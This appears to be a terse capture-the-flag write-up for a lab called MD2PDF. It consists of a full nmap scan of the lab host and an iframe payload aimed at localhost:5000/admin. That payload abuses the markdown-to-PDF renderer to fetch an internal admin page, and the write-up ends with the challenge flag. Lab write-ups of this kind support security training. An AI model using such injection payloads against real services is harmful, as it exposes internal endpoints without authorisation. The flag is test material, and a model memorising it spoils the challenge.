
# MD2PDF

TopTierConversions LTD is proud to present its latest product launch.

# Task 1 Challenge

 

Hello Hacker!

TopTierConversions LTD is proud to announce its latest and greatest product launch: MD2PDF.

This easy-to-use utility converts markdown files to PDF and is totally secure! Right...?

_Note: Please allow 3-5 minutes for the VM to boot up fully before attempting the challenge._

Answer the questions below

What is the flag?


```
 nmap -n -Pn -sV -sC --min-rate 5000 -v -p- -oN nmap 10.81.158.176
Starting Nmap 7.93 ( https://nmap.org ) at 2026-01-22 21:33 UTC
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 21:33
Completed NSE at 21:33, 0.00s elapsed
Initiating NSE at 21:33
Completed NSE at 21:33, 0.00s elapsed
Initiating NSE at 21:33
Completed NSE at 21:33, 0.00s elapsed
Initiating SYN Stealth Scan at 21:33
Scanning 10.81.158.176 [65535 ports]
Discovered open port 22/tcp on 10.81.158.176
Discovered open port 80/tcp on 10.81.158.176
Discovered open port 5000/tcp on 10.81.158.176
Increasing send delay for 10.81.158.176 from 0 to 5 due to max_successful_tryno increase to 4
Completed SYN Stealth Scan at 21:33, 15.16s elapsed (65535 total ports)
Initiating Service scan at 21:33
Scanning 3 services on 10.81.158.176
WARNING: Service 10.81.158.176:80 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
WARNING: Service 10.81.158.176:5000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Completed Service scan at 21:33, 8.38s elapsed (3 services on 1 host)
NSE: Script scanning 10.81.158.176.
Initiating NSE at 21:33
Completed NSE at 21:33, 5.69s elapsed
Initiating NSE at 21:33
Completed NSE at 21:33, 0.40s elapsed
Initiating NSE at 21:33
Completed NSE at 21:33, 0.01s elapsed
Nmap scan report for 10.81.158.176
Host is up (0.19s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 0be49d1ff0c7227215475d5b66c6c119 (RSA)
|   256 ee8e8ab3c720d74cf92b872db6cd0a63 (ECDSA)
|_  256 0b83a0d0d079100c8aca1ff8a8f0150f (ED25519)
80/tcp   open  rtsp
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2660
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <meta
|     name="viewport"
|     content="width=device-width, initial-scale=1, shrink-to-fit=no"
|     <link
|     rel="stylesheet"
|     href="./static/codemirror.min.css"/>
|     <link
|     rel="stylesheet"
|     href="./static/bootstrap.min.css"/>
|     <title>MD2PDF</title>
|     </head>
|     <body>
|     <!-- Navigation -->
|     <nav class="navbar navbar-expand-md navbar-dark bg-dark">
|     <div class="container">
|     class="navbar-brand" href="/"><span class="">MD2PDF</span></a>
|     </div>
|     </nav>
|     <!-- Page Content -->
|     <div class="container">
|     <div class="">
|     <div class="card mt-4">
|     <textarea class="form-control" name="md" id="md"></textarea>
|     </div>
|     <div class="mt-3
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Content-Length: 0
|   RTSPRequest:
|     RTSP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|_    Content-Length: 0
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
|_http-title: MD2PDF
| http-methods:
|_  Supported Methods: GET OPTIONS HEAD
5000/tcp open  rtsp
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2660
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <meta
|     name="viewport"
|     content="width=device-width, initial-scale=1, shrink-to-fit=no"
|     <link
|     rel="stylesheet"
|     href="./static/codemirror.min.css"/>
|     <link
|     rel="stylesheet"
|     href="./static/bootstrap.min.css"/>
|     <title>MD2PDF</title>
|     </head>
|     <body>
|     <!-- Navigation -->
|     <nav class="navbar navbar-expand-md navbar-dark bg-dark">
|     <div class="container">
|     class="navbar-brand" href="/"><span class="">MD2PDF</span></a>
|     </div>
|     </nav>
|     <!-- Page Content -->
|     <div class="container">
|     <div class="">
|     <div class="card mt-4">
|     <textarea class="form-control" name="md" id="md"></textarea>
|     </div>
|     <div class="mt-3
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|   RTSPRequest:
|     RTSP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|_    Content-Length: 0
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.93%I=7%D=1/22%Time=697297B0%P=aarch64-unknown-linux-gnu%
SF:r(GetRequest,AB5,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;
SF:\x20charset=utf-8\r\nContent-Length:\x202660\r\n\r\n<!DOCTYPE\x20html>\
SF:n<html\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charse
SF:t=\"utf-8\"\x20/>\n\x20\x20\x20\x20<meta\n\x20\x20\x20\x20\x20\x20name=
SF:\"viewport\"\n\x20\x20\x20\x20\x20\x20content=\"width=device-width,\x20
SF:initial-scale=1,\x20shrink-to-fit=no\"\n\x20\x20\x20\x20/>\n\n\x20\x20\
SF:x20\x20<link\n\x20\x20\x20\x20\x20\x20rel=\"stylesheet\"\n\x20\x20\x20\
SF:x20\x20\x20href=\"\./static/codemirror\.min\.css\"/>\n\n\x20\x20\x20\x2
SF:0<link\n\x20\x20\x20\x20\x20\x20rel=\"stylesheet\"\n\x20\x20\x20\x20\x2
SF:0\x20href=\"\./static/bootstrap\.min\.css\"/>\n\n\x20\x20\x20\x20\n\x20
SF:\x20\x20\x20<title>MD2PDF</title>\n\x20\x20</head>\n\n\x20\x20<body>\n\
SF:x20\x20\x20\x20<!--\x20Navigation\x20-->\n\x20\x20\x20\x20<nav\x20class
SF:=\"navbar\x20navbar-expand-md\x20navbar-dark\x20bg-dark\">\n\x20\x20\x2
SF:0\x20\x20\x20<div\x20class=\"container\">\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20<a\x20class=\"navbar-brand\"\x20href=\"/\"><span\x20class=\"\">MD2P
SF:DF</span></a>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x20</nav>\n
SF:\n\x20\x20\x20\x20<!--\x20Page\x20Content\x20-->\n\x20\x20\x20\x20<div\
SF:x20class=\"container\">\n\x20\x20\x20\x20\x20\x20<div\x20class=\"\">\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\"card\x20mt-4\">\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20<textarea\x20class=\"form-control\"\x2
SF:0name=\"md\"\x20id=\"md\"></textarea>\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:</div>\n\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\"mt-3\x20")%r(
SF:HTTPOptions,69,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;\x
SF:20charset=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\nContent-Length
SF::\x200\r\n\r\n")%r(RTSPRequest,69,"RTSP/1\.0\x20200\x20OK\r\nContent-Ty
SF:pe:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEA
SF:D\r\nContent-Length:\x200\r\n\r\n")%r(FourOhFourRequest,13F,"HTTP/1\.0\
SF:x20404\x20NOT\x20FOUND\r\nContent-Type:\x20text/html;\x20charset=utf-8\
SF:r\nContent-Length:\x20232\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3
SF:C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>404\x20Not\x20Found</tit
SF:le>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x2
SF:0found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x
SF:20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20agai
SF:n\.</p>\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.93%I=7%D=1/22%Time=697297B0%P=aarch64-unknown-linux-gn
SF:u%r(GetRequest,AB5,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/htm
SF:l;\x20charset=utf-8\r\nContent-Length:\x202660\r\n\r\n<!DOCTYPE\x20html
SF:>\n<html\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20char
SF:set=\"utf-8\"\x20/>\n\x20\x20\x20\x20<meta\n\x20\x20\x20\x20\x20\x20nam
SF:e=\"viewport\"\n\x20\x20\x20\x20\x20\x20content=\"width=device-width,\x
SF:20initial-scale=1,\x20shrink-to-fit=no\"\n\x20\x20\x20\x20/>\n\n\x20\x2
SF:0\x20\x20<link\n\x20\x20\x20\x20\x20\x20rel=\"stylesheet\"\n\x20\x20\x2
SF:0\x20\x20\x20href=\"\./static/codemirror\.min\.css\"/>\n\n\x20\x20\x20\
SF:x20<link\n\x20\x20\x20\x20\x20\x20rel=\"stylesheet\"\n\x20\x20\x20\x20\
SF:x20\x20href=\"\./static/bootstrap\.min\.css\"/>\n\n\x20\x20\x20\x20\n\x
SF:20\x20\x20\x20<title>MD2PDF</title>\n\x20\x20</head>\n\n\x20\x20<body>\
SF:n\x20\x20\x20\x20<!--\x20Navigation\x20-->\n\x20\x20\x20\x20<nav\x20cla
SF:ss=\"navbar\x20navbar-expand-md\x20navbar-dark\x20bg-dark\">\n\x20\x20\
SF:x20\x20\x20\x20<div\x20class=\"container\">\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20<a\x20class=\"navbar-brand\"\x20href=\"/\"><span\x20class=\"\">MD
SF:2PDF</span></a>\n\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x20\x20</nav>
SF:\n\n\x20\x20\x20\x20<!--\x20Page\x20Content\x20-->\n\x20\x20\x20\x20<di
SF:v\x20class=\"container\">\n\x20\x20\x20\x20\x20\x20<div\x20class=\"\">\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\"card\x20mt-4\">\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20<textarea\x20class=\"form-control\"\
SF:x20name=\"md\"\x20id=\"md\"></textarea>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20</div>\n\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\"mt-3\x20")%
SF:r(RTSPRequest,69,"RTSP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;
SF:\x20charset=utf-8\r\nAllow:\x20HEAD,\x20GET,\x20OPTIONS\r\nContent-Leng
SF:th:\x200\r\n\r\n")%r(HTTPOptions,69,"HTTP/1\.0\x20200\x20OK\r\nContent-
SF:Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20HEAD,\x20GET,\x20OPTI
SF:ONS\r\nContent-Length:\x200\r\n\r\n")%r(FourOhFourRequest,13F,"HTTP/1\.
SF:0\x20404\x20NOT\x20FOUND\r\nContent-Type:\x20text/html;\x20charset=utf-
SF:8\r\nContent-Length:\x20232\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//
SF:W3C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>404\x20Not\x20Found</t
SF:itle>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\
SF:x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL
SF:\x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20ag
SF:ain\.</p>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


```
<iframe src="http://localhost:5000/admin"></iframe>

```

flag{1f4a2b6ffeaf4707c43885d704eaee4b}